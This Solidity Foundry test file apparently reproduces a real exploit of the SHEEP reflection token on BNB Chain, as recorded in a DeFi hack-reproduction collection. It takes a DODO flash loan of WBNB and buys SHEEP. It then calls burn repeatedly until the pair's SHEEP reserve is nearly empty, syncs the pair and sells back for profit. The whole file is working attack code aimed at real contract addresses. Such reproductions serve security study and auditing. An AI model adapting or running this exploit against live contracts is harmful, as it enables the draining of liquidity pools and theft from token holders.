// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1623999717482045440
// https://twitter.com/BlockSecTeam/status/1624077078852210691
// @TX
// https://bscscan.com/tx/0x61293c6dd5211a98f1a26c9f6821146e12fb5e20c850ad3ed2528195c8d4c98e
// Related Events
// https://github.com/SunWeb3Sec/DeFiHackLabs/#20230207---fdp---reflection-token
// https://github.com/SunWeb3Sec/DeFiHackLabs/#20230126---tinu---reflection-token

interface RDeflationERC20 is IERC20 {
    function burn(uint256 amount) external;
}

contract ContractTest is Test {
    RDeflationERC20 SHEEP = RDeflationERC20(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24);
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 25_543_755);
    }

    function testExploit() public {
        DVM(dodo).flashLoan(380 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        WBNBToSHEEP();
        while (SHEEP.balanceOf(address(Pair)) > 2) {
            uint256 burnAmount = SHEEP.balanceOf(address(this));
            SHEEP.burn(burnAmount);
        }
        Pair.sync();
        SHEEPToWBNB();
        WBNB.transfer(dodo, 380 * 1e18);
    }

    function WBNBToSHEEP() internal {
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SHEEP);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function SHEEPToWBNB() internal {
        SHEEP.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(SHEEP);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SHEEP.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
